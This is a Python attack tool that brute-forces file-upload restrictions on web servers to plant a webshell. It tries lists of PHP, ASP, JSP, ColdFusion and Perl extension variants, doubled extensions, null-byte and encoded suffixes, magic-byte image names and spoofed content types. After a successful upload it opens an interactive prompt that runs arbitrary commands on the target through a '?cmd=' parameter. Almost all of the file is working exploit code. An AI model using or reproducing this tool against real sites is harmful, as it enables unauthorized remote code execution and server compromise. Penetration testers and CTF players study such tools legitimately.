#!/usr/bin/env python3

# Made by Sagiv
# Brute forcing technique to bypass file upload restrictions
# The tool requires all its assets, do not try to use it without it

import requests
import optparse
import sys
import json
import urllib
from urllib.parse import urlparse
import bs4 as bs
from urllib import request


def auth(URL, SUCCESS, EXTENSION, ALLOWED_EXT, proxies, TLS, headers, brute_force, verbosity, location, username,
         password, data, file_attr):

    # Basic Authentication 

    sauce = urllib.request.urlopen(URL).read()
    soup = bs.BeautifulSoup(sauce, "html.parser")
    form = soup.find('form')
    username_attr = form.find('input', type='text').get('name')

    sauce = urllib.request.urlopen(URL).read()
    soup = bs.BeautifulSoup(sauce, "html.parser")
    form = soup.find('form')
    password_attr = form.find('input', type='password').get('name')

    payload = {
        f'{username_attr}': f'{username}',
        f'{password_attr}': f'{password}'
    }

    session = requests.Session()
    session.post(URL, data=payload)

    file_extension(URL, SUCCESS, EXTENSION, ALLOWED_EXT, proxies, TLS, headers, brute_force, verbosity, location,
                   session, data, file_attr)


def file_extension(URL, SUCCESS, EXTENSION, ALLOWED_EXT, proxies, TLS, headers, brute_force, verbosity, location,
                   session, data, file_attr):
    
    # Brute forcing different extensions and uppercase extensions

    try:
        php = [".php", ".php2", ".php3", ".php4", ".php5", ".php6", ".php7", ".phps", ".phps", ".pht", ".phtm",
               ".phtml",
               ".pgif", ".shtml", ".htaccess", ".phar", ".inc", ".hphp", ".ctp", ".module", ".pHp", ".PhP2", ".PhP3",
               ".PhP4", ".PhP5", ".PhP6", ".PhP7", ".PhPs", ".PhPs", ".pHt", ".pHtm", ".pHtMl", ".pGiF", ".sHtMl",
               ".hTacCess", ".pHar", ".iNc", ".hPhp", ".cTp", ".mOdUle"]
        asp = [".asp", ".aspx", ".config", ".ashx", ".asmx", ".aspq", ".axd", ".cshtm", ".cshtml", ".rem", ".soap",
               ".vbhtm", ".vbhtml", ".asa", ".cer", ".shtml", ".aSp", ".aSpX", ".cOnFig", ".aShx", ".aSmX", ".aSpq",
               ".aXd",
               ".csHtm", ".cShtMl", ".rEm", ".soAp", ".vbHtm", ".vbHtMl", ".aSa", ".cEr", ".shTml"]
        jsp = [".jsp", ".jspx", ".jsw", ".jsv", ".jspf", ".wss", ".do", ".action", ".jSp", ".jSpX", ".jSw", ".jSv",
               ".jsPf",
               ".wSs", ".dO", ".aCtiOn"]
        coldfusion = [".cfm", ".cfml", ".cfc", ".dbm", ".cFm", ".cFml", ".cFc", ".dBm"]
        perl = [".pl", ".cgi", ".pL", ".cGi"]

        if file_attr == 'optional':

            response = session.get(URL, allow_redirects=False)
            sauce = response.text
            soup = bs.BeautifulSoup(sauce, "html.parser")
            form = soup.find('form')
            file_attr = form.find('input', type='file').get('name')
            file_attr = str(file_attr)

            if file_attr == "None":
                file_attr = 'image'

        counter = 0

        print("[-] Trying different file extensions. Please be patient!")

        for ext in eval(EXTENSION):

            counter += 1

            filename = f'shell.{EXTENSION}'
            filename_ext = filename.replace("shell.php", f"shell{ext}")
            files = {
                f'{file_attr}': (filename_ext, open(filename, 'rb'), 'image/jpeg'),
            }

            response = session.post(URL, files=files, headers=headers, data=data, allow_redirects=False,
                                    proxies=proxies,
                                    verify=TLS)

            print(f"[-] Trying differet {EXTENSION} extensions!")
            print(f"[-] Try {counter} with: {filename_ext}")

            if verbosity:
                print(response.text)

            if SUCCESS in response.text:

                if location != 'optional':

                    print(f"[*] File uploaded successfully with: {filename_ext}")
                    domain = urlparse(URL).netloc
                    print(
                        f"[*] You can access the uploaded file on: http://{domain}{location}{filename_ext}?cmd=command")
                    print("[*] Saved in results.txt")
                    f = open("results.txt", "a")
                    f.write(f"File uploaded successfully with: {filename_ext}\n")
                    f.close()

                else:
                    print(f"[*] File uploaded successfully with: {filename_ext}")
                    print(f"[*] You can access the uploaded file: {filename_ext}?cmd=command")
                    print("[*] Saved in results.txt")
                    f = open("results.txt", "a")
                    f.write(f"File uploaded successfully with: {filename_ext}\n")
                    f.close()

                if location != 'optional':

                    while True:
                        try:
                            command = input("└─$ ")
                            cmd_encoded = urllib.parse.quote(command)
                            domain = urlparse(URL).netloc
                            final_url = f"http://{domain}{location}{filename_ext}?cmd={cmd_encoded}"

                            response = session.get(final_url, headers=headers, data=data, allow_redirects=False,
                                                   proxies=proxies, verify=TLS)
                            print(f"URL is: {final_url}")
                            print(response.text)

                        except KeyboardInterrupt:
                            print("KeyboardInterrupt execption is caught!")
                            break

                if verbosity:
                    print(response.text)

                if brute_force:
                    break

                else:
                    sys.exit(1)

    except requests.exceptions.RequestException as error:
        raise SystemExit(error)

    double_extension(URL, SUCCESS, EXTENSION, ALLOWED_EXT, counter, proxies, TLS, headers, brute_force, verbosity,
                     location, session, file_attr, data)


def double_extension(URL, SUCCESS, EXTENSION, ALLOWED_EXT, counter, proxies, TLS, headers, brute_force, verbosity,
                     location, session, file_attr, data):
    
    # Doubling the extension

    php = [".php", ".php2", ".php3", ".php4", ".php5", ".php6", ".php7", ".phps", ".phps", ".pht", ".phtm", ".phtml",
           ".pgif", ".shtml", ".htaccess", ".phar", ".inc", ".hphp", ".ctp", ".module", ".pHp", ".PhP2", ".PhP3",
           ".PhP4", ".PhP5", ".PhP6", ".PhP7", ".PhPs", ".PhPs", ".pHt", ".pHtm", ".pHtMl", ".pGiF", ".sHtMl",
           ".hTacCess", ".pHar", ".iNc", ".hPhp", ".cTp", ".mOdUle"]
    asp = [".asp", ".aspx", ".config", ".ashx", ".asmx", ".aspq", ".axd", ".cshtm", ".cshtml", ".rem", ".soap",
           ".vbhtm", ".vbhtml", ".asa", ".cer", ".shtml", ".aSp", ".aSpX", ".cOnFig", ".aShx", ".aSmX", ".aSpq", ".aXd",
           ".csHtm", ".cShtMl", ".rEm", ".soAp", ".vbHtm", ".vbHtMl", ".aSa", ".cEr", ".shTml"]
    jsp = [".jsp", ".jspx", ".jsw", ".jsv", ".jspf", ".wss", ".do", ".action", ".jSp", ".jSpX", ".jSw", ".jSv", ".jsPf",
           ".wSs", ".dO", ".aCtiOn"]
    coldfusion = [".cfm", ".cfml", ".cfc", ".dbm", ".cFm", ".cFml", ".cFc", ".dBm"]
    perl = [".pl", ".cgi", ".pL", ".cGi"]
    null = ["%20", "%0a", "%00", "%0d%0a", "/", ".\\", ".", "...."]

    for ext in eval(EXTENSION):

        print("[-] Trying Doubling PHP extensions!")
        counter += 1

        filename = f'shell.{EXTENSION}'
        filename_ext = filename.replace(f"shell.{EXTENSION}", f"shell{ext}{ext}")
        files = {
            f'{file_attr}': (filename_ext, open(filename, 'rb'), 'image/jpeg'),
            'submit': (None, 'Upload Image')
        }

        response = session.post(URL, files=files, headers={
            "User-Agent": "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36"},
                                allow_redirects=False, proxies=proxies, verify=TLS)

        print(f"[-] Try {counter} with: {filename_ext}")

        if verbosity:
            print(response.text)

        if SUCCESS in response.text:

            if location != 'optional':

                print(f"[*] File uploaded successfully with: {filename_ext}")
                domain = urlparse(URL).netloc
                print(f"[*] You can access the uploaded file on: http://{domain}{location}{filename_ext}?cmd=command")
                print("[*] Saved in results.txt")
                f = open("results.txt", "a")
                f.write(f"File uploaded successfully with: {filename_ext}\n")
                f.close()

            else:
                print(f"[*] File uploaded successfully with: {filename_ext}")
                print(f"[*] You can access the uploaded file: {filename_ext}?cmd=command")
                print("[*] Saved in results.txt")
                f = open("results.txt", "a")
                f.write(f"File uploaded successfully with: {filename_ext}\n")
                f.close()

            if location != 'optional':

                while True:
                    try:
                        command = input("└─$ ")
                        cmd_encoded = urllib.parse.quote(command)
                        domain = urlparse(URL).netloc
                        final_url = f"http://{domain}{location}{filename_ext}?cmd={cmd_encoded}"

                        response = session.get(final_url, headers=headers, data=data, allow_redirects=False,
                                               proxies=proxies,
                                               verify=TLS)
                        print(f"URL is: {final_url}")
                        print(response.text)

                    except KeyboardInterrupt:
                        print("KeyboardInterrupt execption is caught!")
                        break

            if verbosity:
                print(response.text)

            if brute_force:
                break

            else:
                sys.exit(1)

    null_bytes(EXTENSION, URL, ALLOWED_EXT, counter, SUCCESS, proxies, TLS, headers, brute_force, verbosity, location,
               session, file_attr, data)


def null_bytes(EXTENSION, URL, ALLOWED_EXT, counter, SUCCESS, proxies, TLS, headers, brute_force, verbosity, location,
               session, file_attr, data):
    
    # Adds null bytes to the end of extensions

    php = [".php", ".php2", ".php3", ".php4", ".php5", ".php6", ".php7", ".phps", ".phps", ".pht", ".phtm", ".phtml",
           ".pgif", ".shtml", ".htaccess", ".phar", ".inc", ".hphp", ".ctp", ".module", ".pHp", ".PhP2", ".PhP3",
           ".PhP4", ".PhP5", ".PhP6", ".PhP7", ".PhPs", ".PhPs", ".pHt", ".pHtm", ".pHtMl", ".pGiF", ".sHtMl",
           ".hTacCess", ".pHar", ".iNc", ".hPhp", ".cTp", ".mOdUle"]
    asp = [".asp", ".aspx", ".config", ".ashx", ".asmx", ".aspq", ".axd", ".cshtm", ".cshtml", ".rem", ".soap",
           ".vbhtm", ".vbhtml", ".asa", ".cer", ".shtml", ".aSp", ".aSpX", ".cOnFig", ".aShx", ".aSmX", ".aSpq", ".aXd",
           ".csHtm", ".cShtMl", ".rEm", ".soAp", ".vbHtm", ".vbHtMl", ".aSa", ".cEr", ".shTml"]
    jsp = [".jsp", ".jspx", ".jsw", ".jsv", ".jspf", ".wss", ".do", ".action", ".jSp", ".jSpX", ".jSw", ".jSv", ".jsPf",
           ".wSs", ".dO", ".aCtiOn"]
    coldfusion = [".cfm", ".cfml", ".cfc", ".dbm", ".cFm", ".cFml", ".cFc", ".dBm"]
    perl = [".pl", ".cgi", ".pL", ".cGi"]
    null = ["%20", "%0a", "%00", "%0d%0a", "/", ".\\", ".", "...."]

    for ext in eval(EXTENSION):

        for byte in null:

            counter += 1

            print(f"[-] Trying null bytes at the end of the {EXTENSION} extensions!")
            filename = 'shell.php'
            filename_ext = filename.replace("shell.php", f"shell{ext}{byte}")
            files = {
                f'{file_attr}': (filename_ext, open(filename, 'rb'), 'image/jpeg'),
                'submit': (None, 'Upload Image')
            }

            response = session.post(URL, files=files, headers=headers, data=data,
                                    allow_redirects=False, proxies=proxies, verify=TLS)

            print(f"[-] Try {counter} with: {filename_ext}")

            if verbosity:
                print(response.text)

            if SUCCESS in response.text:

                if location != 'optional':

                    print(f"[*] File uploaded successfully with: {filename_ext}")
                    domain = urlparse(URL).netloc
                    print(
                        f"[*] You can access the uploaded file on: http://{domain}{location}{filename_ext}?cmd=command")
                    print("[*] Saved in results.txt")
                    f = open("results.txt", "a")
                    f.write(f"File uploaded successfully with: {filename_ext}\n")
                    f.close()

                else:
                    print(f"[*] File uploaded successfully with: {filename_ext}")
                    print(f"[*] You can access the uploaded file: {filename_ext}?cmd=command")
                    print("[*] Saved in results.txt")
                    f = open("results.txt", "a")
                    f.write(f"File uploaded successfully with: {filename_ext}\n")
                    f.close()

                if location != 'optional':

                    while True:
                        try:
                            command = input("└─$ ")
                            cmd_encoded = urllib.parse.quote(command)
                            domain = urlparse(URL).netloc
                            final_url = f"http://{domain}{location}{filename_ext}?cmd={cmd_encoded}"

                            response = session.get(final_url, headers=headers, data=data, allow_redirects=False,
                                                   proxies=proxies,
                                                   verify=TLS)
                            print(f"URL is: {final_url}")
                            print(response.text)

                        except KeyboardInterrupt:
                            print("KeyboardInterrupt execption is caught!")
                            break

                if verbosity:
                    print(response.text)

                if brute_force:
                    break

                else:
                    sys.exit(1)

    temp_extension = ALLOWED_EXT

    if "," in temp_extension:

        valid_extensions = temp_extension.split(",")

        for valid in valid_extensions:
            magic_bytes(EXTENSION, valid, URL, counter, SUCCESS, proxies, TLS, headers, brute_force, verbosity,
                        location, session, file_attr, data)

    else:
        valid = "".join(temp_extension)

        magic_bytes(EXTENSION, valid, URL, counter, SUCCESS, proxies, TLS, headers, brute_force, verbosity, location,
                    session, file_attr, data)


def magic_bytes(EXTENSION, valid, URL, counter, SUCCESS, proxies, TLS, headers, brute_force, verbosity, location,
                session, file_attr, data):
    
    # Uploading files with image Magic Bytes

    php = [".php", ".php2", ".php3", ".php4", ".php5", ".php6", ".php7", ".phps", ".phps", ".pht", ".phtm", ".phtml",
           ".pgif", ".shtml", ".htaccess", ".phar", ".inc", ".hphp", ".ctp", ".module", ".pHp", ".PhP2", ".PhP3",
           ".PhP4", ".PhP5", ".PhP6", ".PhP7", ".PhPs", ".PhPs", ".pHt", ".pHtm", ".pHtMl", ".pGiF", ".sHtMl",
           ".hTacCess", ".pHar", ".iNc", ".hPhp", ".cTp", ".mOdUle"]
    asp = [".asp", ".aspx", ".config", ".ashx", ".asmx", ".aspq", ".axd", ".cshtm", ".cshtml", ".rem", ".soap",
           ".vbhtm", ".vbhtml", ".asa", ".cer", ".shtml", ".aSp", ".aSpX", ".cOnFig", ".aShx", ".aSmX", ".aSpq", ".aXd",
           ".csHtm", ".cShtMl", ".rEm", ".soAp", ".vbHtm", ".vbHtMl", ".aSa", ".cEr", ".shTml"]
    jsp = [".jsp", ".jspx", ".jsw", ".jsv", ".jspf", ".wss", ".do", ".action", ".jSp", ".jSpX", ".jSw", ".jSv", ".jsPf",
           ".wSs", ".dO", ".aCtiOn"]
    coldfusion = [".cfm", ".cfml", ".cfc", ".dbm", ".cFm", ".cFml", ".cFc", ".dBm"]
    perl = [".pl", ".cgi", ".pL", ".cGi"]
    null = ["%20", "%0a", "%00", "%0d%0a", "/", ".\\", ".", "...."]

    for ext in eval(EXTENSION):  # trying to upload malicious picture with image extensions and their magic bytes

        if valid == 'jpeg' or valid == 'jpg' or valid == 'png' and EXTENSION == 'php':

            print(
                f"[-] Trying valid {valid} extension before PHP extension with Magic bytes. Please be patient!")

            counter += 1

            filename = f'shell.{valid}.php'
            filename_ext = filename.replace(F".php", f"{ext}")

            print(f"[-] Try {counter} with: {filename_ext}")

            files = {
                f'{file_attr}': (filename_ext, open(filename, 'rb'), 'image/jpeg'),
                'submit': (None, 'Upload Image')
            }

            response = session.post(URL, files=files, headers=headers, data=data,
                                    allow_redirects=False, proxies=proxies, verify=TLS)

            if verbosity:
                print(response.text)

            success = str(SUCCESS)

            if success in response.text:

                if location != 'optional':

                    print(f"[*] File uploaded successfully with: {filename_ext}")
                    domain = urlparse(URL).netloc
                    print(
                        f"[*] You can access the uploaded file on: http://{domain}{location}{filename_ext}?cmd=command")
                    print("[*] Saved in results.txt")
                    f = open("results.txt", "a")
                    f.write(f"File uploaded successfully with: {filename_ext}\n")
                    f.close()

                else:
                    print(f"[*] File uploaded successfully with: {filename_ext}")
                    print(f"[*] You can access the uploaded file: {filename_ext}?cmd=command")
                    print("[*] Saved in results.txt")
                    f = open("results.txt", "a")
                    f.write(f"File uploaded successfully with: {filename_ext}\n")
                    f.close()

                if location != 'optional':

                    while True:
                        try:
                            command = input("└─$ ")
                            cmd_encoded = urllib.parse.quote(command)
                            domain = urlparse(URL).netloc
                            final_url = f"http://{domain}{location}{filename_ext}?cmd={cmd_encoded}"

                            response = session.get(final_url, headers=headers, data=data, allow_redirects=False,
                                                   proxies=proxies,
                                                   verify=TLS)
                            print(f"URL is: {final_url}")
                            print(response.text)

                        except KeyboardInterrupt:
                            print("KeyboardInterrupt execption is caught!")
                            break

                if brute_force:
                    break
                else:
                    sys.exit()

    for ext in eval(EXTENSION):  # Same loop but checking valid upload extension after server extension!

        if valid == 'jpeg' or valid == 'jpg' or valid == 'png' and EXTENSION == 'php':

            print(
                f"[-] Trying valid {valid} extension after {EXTENSION} with Magic bytes. Please be patient!")

            filename = f'shell.php.{valid}'
            filename_ext = filename.replace(".php", f"{ext}")

            print(f"[-] Try {counter} with: {filename_ext}")

            files = {
                f'{file_attr}': (filename_ext, open(filename, 'rb'), 'image/jpeg'),
                'submit': (None, 'Upload Image')
            }

            response = session.post(URL, files=files, headers=headers, data=data,
                                    allow_redirects=False, proxies=proxies, verify=TLS)

            if verbosity:
                print(response.text)

            if SUCCESS in response.text:

                if location != 'optional':

                    print(f"[*] File uploaded successfully with: {filename_ext}")
                    domain = urlparse(URL).netloc
                    print(
                        f"[*] You can access the uploaded file on: http://{domain}{location}{filename_ext}?cmd=command")
                    print("[*] Saved in results.txt")
                    f = open("results.txt", "a")
                    f.write(f"File uploaded successfully with: {filename_ext}\n")
                    f.close()

                else:
                    print(f"[*] File uploaded successfully with: {filename_ext}")
                    print(f"[*] You can access the uploaded file: {filename_ext}?cmd=command")
                    print("[*] Saved in results.txt")
                    f = open("results.txt", "a")
                    f.write(f"File uploaded successfully with: {filename_ext}\n")
                    f.close()

                if location != 'optional':

                    while True:
                        try:
                            command = input("└─$ ")
                            cmd_encoded = urllib.parse.quote(command)
                            domain = urlparse(URL).netloc
                            final_url = f"http://{domain}{location}{filename_ext}?cmd={cmd_encoded}"

                            response = session.get(final_url, headers=headers, data=data, allow_redirects=False,
                                                   proxies=proxies,
                                                   verify=TLS)
                            print(f"URL is: {final_url}")
                            print(response.text)

                        except KeyboardInterrupt:
                            print("KeyboardInterrupt execption is caught!")
                            break

                if verbosity:
                    print(response.text)

                if brute_force:
                    break

                else:
                    sys.exit()

    content_type(URL, SUCCESS, EXTENSION, counter, proxies, TLS, headers, brute_force, verbosity, location, session,
                file_attr, data)


def content_type(URL, SUCCESS, EXTENSION, counter, proxies, TLS, headers, brute_force, verbosity, location, session,
                file_attr, data):
    
    # Trying different content types

    print("[-] Trying different content-type headers. Please be patient!")

    with open("./content-type.txt", encoding='latin-1') as file:

        for line in file:
            wordlist = line.rstrip()
            counter += 1

            print(f"[-] Try {counter} with Content-Type: {wordlist}")

            files = {
                f'{file_attr}': (f'shell.{EXTENSION}', open(f'shell.{EXTENSION}', 'rb'), wordlist),
                'submit': (None, 'Upload Image')
            }

            response = session.post(URL, files=files, headers=headers, data=data,
                                    allow_redirects=False, proxies=proxies, verify=TLS)

            if verbosity:
                print(response.text)

            if SUCCESS in response.text:

                if location != 'optional':

                    print(f"[*] File uploaded successfully with Content-Type: {wordlist}")
                    domain = urlparse(URL).netloc
                    print(
                        f"[*] You can access the uploaded file on: http://{domain}{location}shell.{EXTENSION}?cmd=command")
                    print("[*] Saved in results.txt")
                    f = open("results.txt", "a")
                    f.close()

                else:
                    print(f"[*] File uploaded successfully with Content-Type: {wordlist}")
                    print("[*] Saved in results.txt")
                    f = open("results.txt", "a")
                    f.write(f"[*] File uploaded successfully with Content-Type: {wordlist}")
                    f.close()

                if location != 'optional':

                    while True:
                        try:
                            command = input("└─$ ")
                            cmd_encoded = urllib.parse.quote(command)
                            domain = urlparse(URL).netloc
                            final_url = f"http://{domain}{location}shell.{EXTENSION}?cmd={cmd_encoded}"

                            response = session.get(final_url, headers=headers, data=data, allow_redirects=False,
                                                   proxies=proxies,
                                                   verify=TLS)
                            print(f"URL is: {final_url}")
                            print(response.text)

                        except KeyboardInterrupt:
                            print("KeyboardInterrupt execption is caught!")
                            break

                if verbosity:
                    print(response.text)

                if brute_force:
                    break

                else:
                    sys.exit(1)


def main():
    # Main function with all its arguments parsing

    parser = optparse.OptionParser()

    parser.add_option('-u', "--url", dest="url",
                      help="Supply the login page, for example: http://192.168.98.200/login.php'",
                      default="required_to_be_true")

    parser.add_option('-s', "--success", type="string", dest="success_message",
                      help="Success message when upload an image, example: 'Image uploaded successfully.'",
                      default="required_to_be_true")

    parser.add_option('-e', "--extension", type="string", dest="extension",
                      help="Provide server backend extension, for example: --extension php (Supported extensions: php,asp,jsp,perl)",
                      default="required_to_be_true")

    parser.add_option('-a', "--allowed", type="string", dest="allowed_extensions",
                      help="Provide allowed extensions to be uploaded, for example: php,asp,jsp,perl",
                      default="required_to_be_true")

    parser.add_option('-H', "--header", type="string", dest="header",
                      help='(Optional) - for example: \'"X-Forwarded-For": "10.10.10.10"\' - Use double quotes and wrapp it with single quotes. Use comma to separate multi headers.',
                      default="optional")

    parser.add_option('-d', "--data", type="string", dest="data",
                      help='(Optional) - Form data for example: \'"submit": "submit"\' - Use double quotes and wrapp it with single quotes. Use comma to separate multi data.',
                      default="optional")

    parser.add_option('-f', "--file", type="string", dest="file_attr",
                      help='(Optional) - File type attribute name for example: -f myfile. Some website might check that (You check the browser page source).',
                      default="optional")

    parser.add_option('-l', "--location", type="string", dest="location",
                      help='(Optional) - Supply a remote path where the webshell suppose to be. For exmaple: /uploads/',
                      default="optional")

    parser.add_option('-U', "--username", type="string", dest="username",
                      help='(Optional) - Username for authentication. For exmaple: --username admin',
                      default="optional")

    parser.add_option('-P', "--password", type="string", dest="password",
                      help='(Optional) - - Password for authentication. For exmaple: --username 12345',
                      default="optional")

    parser.add_option('-S', "--ssl", action="store_true", dest="ssl", help="(Optional) - No checks for TLS or SSL")

    parser.add_option('-p', "--proxy", action="store_true", dest="proxy",
                      help="(Optional) - Channel the requests through proxy")

    parser.add_option('-c', "--continue", action="store_true", dest="continue_brute",
                      help="(Optional) - If set, the brute force will continue even if one or more methods found!")

    parser.add_option('-v', "--verbose", action="store_true", dest="verbosity",
                      help="(Optional) - Printing the http response in terminal")

    (options, arguments) = parser.parse_args()

    URL = options.url
    HEADER = options.header
    SUCCESS = options.success_message
    EXTENSION = options.extension
    ALLOWED_EXT = options.allowed_extensions
    proxy = options.proxy
    TLS = options.ssl
    brute_force = options.continue_brute
    file_attr = options.file_attr
    username = options.username
    password = options.password
    data = options.data
    verbosity = options.verbosity
    location = options.location

    if username != 'optional' and password == 'optional':
        print("Password is required!")

    elif username == 'optional' and password != 'optional':
        print("Username is required!")

    if TLS:
        TLS = False

    else:
        TLS = True

    if proxy:
        print("Proxy is on http://127.0.0.1:8080")

        proxies = {
            'http': 'http://127.0.0.1:8080',
            'https': 'http://127.0.0.1:8080',
        }

    else:

        proxies = {

            'http': None,
            'https': None
        }

    if HEADER != 'optional':

        temp_header = "{" + str(HEADER) + "}"
        headers = json.loads(temp_header)

    else:
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36"
        }

    if data != 'optional':

        temp_data = "{" + str(data) + "}"
        data = json.loads(temp_data)

    else:
        data = {
            "dummy": "dummy"
        }

    positional_args = [URL, SUCCESS, EXTENSION, ALLOWED_EXT]

    if len(sys.argv) < 2:
        print("Try '-h or --help' for more information.")
        sys.exit(1)

    else:

        if len(sys.argv) > 2 and "required_to_be_true" in positional_args:
            print("--url, --wordlist, --error and --request are postional arguments!")
            sys.exit(1)

        else:

            if username != 'optional' and password != 'optional':

                auth(URL, SUCCESS, EXTENSION, ALLOWED_EXT, proxies, TLS, headers, brute_force, verbosity,
                     location, username, password, data, file_attr)

            else:
                session = requests.Session()
                file_extension(URL, SUCCESS, EXTENSION, ALLOWED_EXT, proxies, TLS, headers, brute_force, verbosity,
                               location, session, data, file_attr)


if __name__ == "__main__":
    main()
